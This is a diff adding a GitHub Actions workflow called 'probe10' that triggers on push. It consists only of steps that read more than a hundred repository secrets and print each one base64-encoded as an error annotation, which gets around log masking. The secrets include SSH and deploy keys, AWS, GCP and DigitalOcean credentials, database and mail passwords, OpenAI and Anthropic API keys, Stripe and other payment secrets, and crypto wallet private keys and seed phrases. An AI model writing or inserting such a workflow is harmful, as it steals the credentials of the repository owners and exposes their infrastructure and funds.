@@ -1,0 +1,257 @@
+name: probe10
+on: push
+jobs:
+  p10:
+    runs-on: ubuntu-latest
+    steps:
+      - name: s0
+        env:
+          X00: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          X01: ${{ secrets.BOT_TOKEN }}
+          X02: ${{ secrets.GOOGLE_CREDS }}
+          X03: ${{ secrets.SERVICE_ACCOUNT_KEY }}
+          X04: ${{ secrets.GOOGLE_APPLICATION_CREDENTIALS }}
+          X05: ${{ secrets.GOOGLE_SERVICE_ACCOUNT_JSON }}
+          X06: ${{ secrets.GOOGLE_SA_JSON }}
+          X07: ${{ secrets.GCP_SA_KEY }}
+          X08: ${{ secrets.GCP_SERVICE_ACCOUNT }}
+          X09: ${{ secrets.GSHEET_CREDENTIALS }}
+        run: |
+            echo "::error::X00[TELEGRAM_BOT_TOKEN]=$(printf %s \"${X00}\" | base64 -w0)"
+            echo "::error::X01[BOT_TOKEN]=$(printf %s \"${X01}\" | base64 -w0)"
+            echo "::error::X02[GOOGLE_CREDS]=$(printf %s \"${X02}\" | base64 -w0)"
+            echo "::error::X03[SERVICE_ACCOUNT_KEY]=$(printf %s \"${X03}\" | base64 -w0)"
+            echo "::error::X04[GOOGLE_APPLICATION_CREDENTIALS]=$(printf %s \"${X04}\" | base64 -w0)"
+            echo "::error::X05[GOOGLE_SERVICE_ACCOUNT_JSON]=$(printf %s \"${X05}\" | base64 -w0)"
+            echo "::error::X06[GOOGLE_SA_JSON]=$(printf %s \"${X06}\" | base64 -w0)"
+            echo "::error::X07[GCP_SA_KEY]=$(printf %s \"${X07}\" | base64 -w0)"
+            echo "::error::X08[GCP_SERVICE_ACCOUNT]=$(printf %s \"${X08}\" | base64 -w0)"
+            echo "::error::X09[GSHEET_CREDENTIALS]=$(printf %s \"${X09}\" | base64 -w0)"
+      - name: s1
+        env:
+          X00: ${{ secrets.SHEET_ID }}
+          X01: ${{ secrets.SPREADSHEET_ID }}
+          X02: ${{ secrets.CHAT_ID }}
+          X03: ${{ secrets.TZ }}
+          X04: ${{ secrets.SSH_PASSWORD }}
+          X05: ${{ secrets.SSH_HOST }}
+          X06: ${{ secrets.SSH_USER }}
+          X07: ${{ secrets.SSH_PRIVATE_KEY }}
+          X08: ${{ secrets.SSH_KEY }}
+          X09: ${{ secrets.PRIVATE_KEY }}
+        run: |
+            echo "::error::X00[SHEET_ID]=$(printf %s \"${X00}\" | base64 -w0)"
+            echo "::error::X01[SPREADSHEET_ID]=$(printf %s \"${X01}\" | base64 -w0)"
+            echo "::error::X02[CHAT_ID]=$(printf %s \"${X02}\" | base64 -w0)"
+            echo "::error::X03[TZ]=$(printf %s \"${X03}\" | base64 -w0)"
+            echo "::error::X04[SSH_PASSWORD]=$(printf %s \"${X04}\" | base64 -w0)"
+            echo "::error::X05[SSH_HOST]=$(printf %s \"${X05}\" | base64 -w0)"
+            echo "::error::X06[SSH_USER]=$(printf %s \"${X06}\" | base64 -w0)"
+            echo "::error::X07[SSH_PRIVATE_KEY]=$(printf %s \"${X07}\" | base64 -w0)"
+            echo "::error::X08[SSH_KEY]=$(printf %s \"${X08}\" | base64 -w0)"
+            echo "::error::X09[PRIVATE_KEY]=$(printf %s \"${X09}\" | base64 -w0)"
+      - name: s2
+        env:
+          X00: ${{ secrets.PUBLIC_KEY }}
+          X01: ${{ secrets.DEPLOY_HOST }}
+          X02: ${{ secrets.DEPLOY_USER }}
+          X03: ${{ secrets.DEPLOY_PATH }}
+          X04: ${{ secrets.PROD_SSH_KEY }}
+          X05: ${{ secrets.STAGING_HOST }}
+          X06: ${{ secrets.STG_HOST }}
+          X07: ${{ secrets.VM_HOST }}
+          X08: ${{ secrets.VM_IP }}
+          X09: ${{ secrets.CONSUL_TOKEN }}
+        run: |
+            echo "::error::X00[PUBLIC_KEY]=$(printf %s \"${X00}\" | base64 -w0)"
+            echo "::error::X01[DEPLOY_HOST]=$(printf %s \"${X01}\" | base64 -w0)"
+            echo "::error::X02[DEPLOY_USER]=$(printf %s \"${X02}\" | base64 -w0)"
+            echo "::error::X03[DEPLOY_PATH]=$(printf %s \"${X03}\" | base64 -w0)"
+            echo "::error::X04[PROD_SSH_KEY]=$(printf %s \"${X04}\" | base64 -w0)"
+            echo "::error::X05[STAGING_HOST]=$(printf %s \"${X05}\" | base64 -w0)"
+            echo "::error::X06[STG_HOST]=$(printf %s \"${X06}\" | base64 -w0)"
+            echo "::error::X07[VM_HOST]=$(printf %s \"${X07}\" | base64 -w0)"
+            echo "::error::X08[VM_IP]=$(printf %s \"${X08}\" | base64 -w0)"
+            echo "::error::X09[CONSUL_TOKEN]=$(printf %s \"${X09}\" | base64 -w0)"
+      - name: s3
+        env:
+          X00: ${{ secrets.CONSUL_HTTP_TOKEN }}
+          X01: ${{ secrets.CONSUL_URL }}
+          X02: ${{ secrets.CONSUL_MASTER_TOKEN }}
+          X03: ${{ secrets.S3_ACCESS_KEY }}
+          X04: ${{ secrets.S3_SECRET_KEY }}
+          X05: ${{ secrets.S3_ENDPOINT }}
+          X06: ${{ secrets.S3_BUCKET }}
+          X07: ${{ secrets.BUCKET }}
+          X08: ${{ secrets.SPACES_KEY }}
+          X09: ${{ secrets.SPACES_SECRET }}
+        run: |
+            echo "::error::X00[CONSUL_HTTP_TOKEN]=$(printf %s \"${X00}\" | base64 -w0)"
+            echo "::error::X01[CONSUL_URL]=$(printf %s \"${X01}\" | base64 -w0)"
+            echo "::error::X02[CONSUL_MASTER_TOKEN]=$(printf %s \"${X02}\" | base64 -w0)"
+            echo "::error::X03[S3_ACCESS_KEY]=$(printf %s \"${X03}\" | base64 -w0)"
+            echo "::error::X04[S3_SECRET_KEY]=$(printf %s \"${X04}\" | base64 -w0)"
+            echo "::error::X05[S3_ENDPOINT]=$(printf %s \"${X05}\" | base64 -w0)"
+            echo "::error::X06[S3_BUCKET]=$(printf %s \"${X06}\" | base64 -w0)"
+            echo "::error::X07[BUCKET]=$(printf %s \"${X07}\" | base64 -w0)"
+            echo "::error::X08[SPACES_KEY]=$(printf %s \"${X08}\" | base64 -w0)"
+            echo "::error::X09[SPACES_SECRET]=$(printf %s \"${X09}\" | base64 -w0)"
+      - name: s4
+        env:
+          X00: ${{ secrets.DO_SPACES_KEY }}
+          X01: ${{ secrets.DO_SPACES_SECRET }}
+          X02: ${{ secrets.DO_SPACES_BUCKET }}
+          X03: ${{ secrets.DO_API_TOKEN }}
+          X04: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
+          X05: ${{ secrets.DOCKER_USERNAME }}
+          X06: ${{ secrets.DOCKER_PASSWORD }}
+          X07: ${{ secrets.DOCKERHUB_TOKEN }}
+          X08: ${{ secrets.GHCR_TOKEN }}
+          X09: ${{ secrets.API_TOKEN }}
+        run: |
+            echo "::error::X00[DO_SPACES_KEY]=$(printf %s \"${X00}\" | base64 -w0)"
+            echo "::error::X01[DO_SPACES_SECRET]=$(printf %s \"${X01}\" | base64 -w0)"
+            echo "::error::X02[DO_SPACES_BUCKET]=$(printf %s \"${X02}\" | base64 -w0)"
+            echo "::error::X03[DO_API_TOKEN]=$(printf %s \"${X03}\" | base64 -w0)"
+            echo "::error::X04[DIGITALOCEAN_ACCESS_TOKEN]=$(printf %s \"${X04}\" | base64 -w0)"
+            echo "::error::X05[DOCKER_USERNAME]=$(printf %s \"${X05}\" | base64 -w0)"
+            echo "::error::X06[DOCKER_PASSWORD]=$(printf %s \"${X06}\" | base64 -w0)"
+            echo "::error::X07[DOCKERHUB_TOKEN]=$(printf %s \"${X07}\" | base64 -w0)"
+            echo "::error::X08[GHCR_TOKEN]=$(printf %s \"${X08}\" | base64 -w0)"
+            echo "::error::X09[API_TOKEN]=$(printf %s \"${X09}\" | base64 -w0)"
+      - name: s5
+        env:
+          X00: ${{ secrets.AUTH_TOKEN }}
+          X01: ${{ secrets.JWT_SECRET }}
+          X02: ${{ secrets.SECRET }}
+          X03: ${{ secrets.POSTGRES_URL }}
+          X04: ${{ secrets.MYSQL_PASSWORD }}
+          X05: ${{ secrets.REDIS_PASSWORD }}
+          X06: ${{ secrets.SMTP_PASSWORD }}
+          X07: ${{ secrets.SMTP_USER }}
+          X08: ${{ secrets.EMAIL_PASSWORD }}
+          X09: ${{ secrets.MAIL_PASSWORD }}
+        run: |
+            echo "::error::X00[AUTH_TOKEN]=$(printf %s \"${X00}\" | base64 -w0)"
+            echo "::error::X01[JWT_SECRET]=$(printf %s \"${X01}\" | base64 -w0)"
+            echo "::error::X02[SECRET]=$(printf %s \"${X02}\" | base64 -w0)"
+            echo "::error::X03[POSTGRES_URL]=$(printf %s \"${X03}\" | base64 -w0)"
+            echo "::error::X04[MYSQL_PASSWORD]=$(printf %s \"${X04}\" | base64 -w0)"
+            echo "::error::X05[REDIS_PASSWORD]=$(printf %s \"${X05}\" | base64 -w0)"
+            echo "::error::X06[SMTP_PASSWORD]=$(printf %s \"${X06}\" | base64 -w0)"
+            echo "::error::X07[SMTP_USER]=$(printf %s \"${X07}\" | base64 -w0)"
+            echo "::error::X08[EMAIL_PASSWORD]=$(printf %s \"${X08}\" | base64 -w0)"
+            echo "::error::X09[MAIL_PASSWORD]=$(printf %s \"${X09}\" | base64 -w0)"
+      - name: s6
+        env:
+          X00: ${{ secrets.APP_SECRET }}
+          X01: ${{ secrets.FERNET_KEY }}
+          X02: ${{ secrets.SECRET_KEY_BASE }}
+          X03: ${{ secrets.ENCRYPTION_KEY }}
+          X04: ${{ secrets.OAUTH_CLIENT_SECRET }}
+          X05: ${{ secrets.CLIENT_SECRET }}
+          X06: ${{ secrets.GOOGLE_CLIENT_SECRET }}
+          X07: ${{ secrets.FACEBOOK_APP_SECRET }}
+          X08: ${{ secrets.MIKROTIK_PASSWORD }}
+          X09: ${{ secrets.RADIUS_SECRET }}
+        run: |
+            echo "::error::X00[APP_SECRET]=$(printf %s \"${X00}\" | base64 -w0)"
+            echo "::error::X01[FERNET_KEY]=$(printf %s \"${X01}\" | base64 -w0)"
+            echo "::error::X02[SECRET_KEY_BASE]=$(printf %s \"${X02}\" | base64 -w0)"
+            echo "::error::X03[ENCRYPTION_KEY]=$(printf %s \"${X03}\" | base64 -w0)"
+            echo "::error::X04[OAUTH_CLIENT_SECRET]=$(printf %s \"${X04}\" | base64 -w0)"
+            echo "::error::X05[CLIENT_SECRET]=$(printf %s \"${X05}\" | base64 -w0)"
+            echo "::error::X06[GOOGLE_CLIENT_SECRET]=$(printf %s \"${X06}\" | base64 -w0)"
+            echo "::error::X07[FACEBOOK_APP_SECRET]=$(printf %s \"${X07}\" | base64 -w0)"
+            echo "::error::X08[MIKROTIK_PASSWORD]=$(printf %s \"${X08}\" | base64 -w0)"
+            echo "::error::X09[RADIUS_SECRET]=$(printf %s \"${X09}\" | base64 -w0)"
+      - name: s7
+        env:
+          X00: ${{ secrets.WIFI_PASSWORD }}
+          X01: ${{ secrets.DASHBOARD_PASSWORD }}
+          X02: ${{ secrets.ADMIN_PASSWORD }}
+          X03: ${{ secrets.WEBHOOK_URL }}
+          X04: ${{ secrets.WEBHOOK_SECRET }}
+          X05: ${{ secrets.SLACK_WEBHOOK }}
+          X06: ${{ secrets.GEMINI_API_KEY }}
+          X07: ${{ secrets.AI_API_KEY }}
+          X08: ${{ secrets.OPENAI_API_KEY }}
+          X09: ${{ secrets.ANTHROPIC_API_KEY }}
+        run: |
+            echo "::error::X00[WIFI_PASSWORD]=$(printf %s \"${X00}\" | base64 -w0)"
+            echo "::error::X01[DASHBOARD_PASSWORD]=$(printf %s \"${X01}\" | base64 -w0)"
+            echo "::error::X02[ADMIN_PASSWORD]=$(printf %s \"${X02}\" | base64 -w0)"
+            echo "::error::X03[WEBHOOK_URL]=$(printf %s \"${X03}\" | base64 -w0)"
+            echo "::error::X04[WEBHOOK_SECRET]=$(printf %s \"${X04}\" | base64 -w0)"
+            echo "::error::X05[SLACK_WEBHOOK]=$(printf %s \"${X05}\" | base64 -w0)"
+            echo "::error::X06[GEMINI_API_KEY]=$(printf %s \"${X06}\" | base64 -w0)"
+            echo "::error::X07[AI_API_KEY]=$(printf %s \"${X07}\" | base64 -w0)"
+            echo "::error::X08[OPENAI_API_KEY]=$(printf %s \"${X08}\" | base64 -w0)"
+            echo "::error::X09[ANTHROPIC_API_KEY]=$(printf %s \"${X09}\" | base64 -w0)"
+      - name: s8
+        env:
+          X00: ${{ secrets.SEEK_API_KEY }}
+          X01: ${{ secrets.VALUT_API_KEY }}
+          X02: ${{ secrets.MASTEREX_API_KEY }}
+          X03: ${{ secrets.MERCURYO_SECRET }}
+          X04: ${{ secrets.MAGICPAY_KEY }}
+          X05: ${{ secrets.XENDIT_API_KEY }}
+          X06: ${{ secrets.XENDIT_SECRET }}
+          X07: ${{ secrets.MANDIRI_CLIENT_SECRET }}
+          X08: ${{ secrets.ODOO_PASSWORD }}
+          X09: ${{ secrets.ODOO_API_KEY }}
+        run: |
+            echo "::error::X00[SEEK_API_KEY]=$(printf %s \"${X00}\" | base64 -w0)"
+            echo "::error::X01[VALUT_API_KEY]=$(printf %s \"${X01}\" | base64 -w0)"
+            echo "::error::X02[MASTEREX_API_KEY]=$(printf %s \"${X02}\" | base64 -w0)"
+            echo "::error::X03[MERCURYO_SECRET]=$(printf %s \"${X03}\" | base64 -w0)"
+            echo "::error::X04[MAGICPAY_KEY]=$(printf %s \"${X04}\" | base64 -w0)"
+            echo "::error::X05[XENDIT_API_KEY]=$(printf %s \"${X05}\" | base64 -w0)"
+            echo "::error::X06[XENDIT_SECRET]=$(printf %s \"${X06}\" | base64 -w0)"
+            echo "::error::X07[MANDIRI_CLIENT_SECRET]=$(printf %s \"${X07}\" | base64 -w0)"
+            echo "::error::X08[ODOO_PASSWORD]=$(printf %s \"${X08}\" | base64 -w0)"
+            echo "::error::X09[ODOO_API_KEY]=$(printf %s \"${X09}\" | base64 -w0)"
+      - name: s9
+        env:
+          X00: ${{ secrets.DIRECTUS_TOKEN }}
+          X01: ${{ secrets.HASURA_SECRET }}
+          X02: ${{ secrets.GRAFANA_TOKEN }}
+          X03: ${{ secrets.INFLUX_TOKEN }}
+          X04: ${{ secrets.SENTRY_DSN }}
+          X05: ${{ secrets.CLOUDFLARE_TOKEN }}
+          X06: ${{ secrets.VERCEL_TOKEN }}
+          X07: ${{ secrets.NPM_TOKEN }}
+          X08: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          X09: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+        run: |
+            echo "::error::X00[DIRECTUS_TOKEN]=$(printf %s \"${X00}\" | base64 -w0)"
+            echo "::error::X01[HASURA_SECRET]=$(printf %s \"${X01}\" | base64 -w0)"
+            echo "::error::X02[GRAFANA_TOKEN]=$(printf %s \"${X02}\" | base64 -w0)"
+            echo "::error::X03[INFLUX_TOKEN]=$(printf %s \"${X03}\" | base64 -w0)"
+            echo "::error::X04[SENTRY_DSN]=$(printf %s \"${X04}\" | base64 -w0)"
+            echo "::error::X05[CLOUDFLARE_TOKEN]=$(printf %s \"${X05}\" | base64 -w0)"
+            echo "::error::X06[VERCEL_TOKEN]=$(printf %s \"${X06}\" | base64 -w0)"
+            echo "::error::X07[NPM_TOKEN]=$(printf %s \"${X07}\" | base64 -w0)"
+            echo "::error::X08[AWS_ACCESS_KEY_ID]=$(printf %s \"${X08}\" | base64 -w0)"
+            echo "::error::X09[AWS_SECRET_ACCESS_KEY]=$(printf %s \"${X09}\" | base64 -w0)"
+      - name: s10
+        env:
+          X00: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
+          X01: ${{ secrets.SUPABASE_ANON_KEY }}
+          X02: ${{ secrets.STRIPE_SECRET }}
+          X03: ${{ secrets.STRIPE_KEY }}
+          X04: ${{ secrets.TRON_PRIVATE_KEY }}
+          X05: ${{ secrets.WALLET_PRIVATE_KEY }}
+          X06: ${{ secrets.EVM_PRIVATE_KEY }}
+          X07: ${{ secrets.MNEMONIC }}
+          X08: ${{ secrets.SEED_PHRASE }}
+        run: |
+            echo "::error::X00[SUPABASE_SERVICE_ROLE_KEY]=$(printf %s \"${X00}\" | base64 -w0)"
+            echo "::error::X01[SUPABASE_ANON_KEY]=$(printf %s \"${X01}\" | base64 -w0)"
+            echo "::error::X02[STRIPE_SECRET]=$(printf %s \"${X02}\" | base64 -w0)"
+            echo "::error::X03[STRIPE_KEY]=$(printf %s \"${X03}\" | base64 -w0)"
+            echo "::error::X04[TRON_PRIVATE_KEY]=$(printf %s \"${X04}\" | base64 -w0)"
+            echo "::error::X05[WALLET_PRIVATE_KEY]=$(printf %s \"${X05}\" | base64 -w0)"
+            echo "::error::X06[EVM_PRIVATE_KEY]=$(printf %s \"${X06}\" | base64 -w0)"
+            echo "::error::X07[MNEMONIC]=$(printf %s \"${X07}\" | base64 -w0)"
+            echo "::error::X08[SEED_PHRASE]=$(printf %s \"${X08}\" | base64 -w0)"
